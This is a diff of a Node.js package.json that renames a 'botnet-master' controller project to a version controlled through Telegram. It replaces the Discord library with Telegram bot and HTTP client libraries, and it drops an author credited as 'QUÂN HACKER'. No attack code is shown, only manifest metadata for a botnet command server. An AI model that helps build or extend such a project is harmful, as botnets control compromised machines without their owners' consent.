@@ -1,20 +1,18 @@
 {
-  "name": "botnet-master",
-  "version": "4.0.0",
-  "description": "Botnet Master Controller - SIÊU ỔN ĐỊNH",
-  "main": "master.js",
+  "name": "botnet-master-telegram",
+  "version": "1.0.0",
+  "description": "Botnet Master điều khiển qua Telegram",
+  "main": "bot_master.js",
   "scripts": {
-    "start": "node master.js"
+    "start": "node bot_master.js"
   },
   "dependencies": {
     "express": "^4.18.2",
     "socket.io": "^4.7.2",
-    "discord.js": "^14.14.1"
+    "node-telegram-bot-api": "^0.61.0",
+    "axios": "^1.6.2"
   },
   "engines": {
     "node": ">=18.0.0"
-  },
-  "keywords": ["botnet", "master", "controller", "discord"],
-  "author": "QUÂN HACKER",
-  "license": "MIT"
+  }
 }
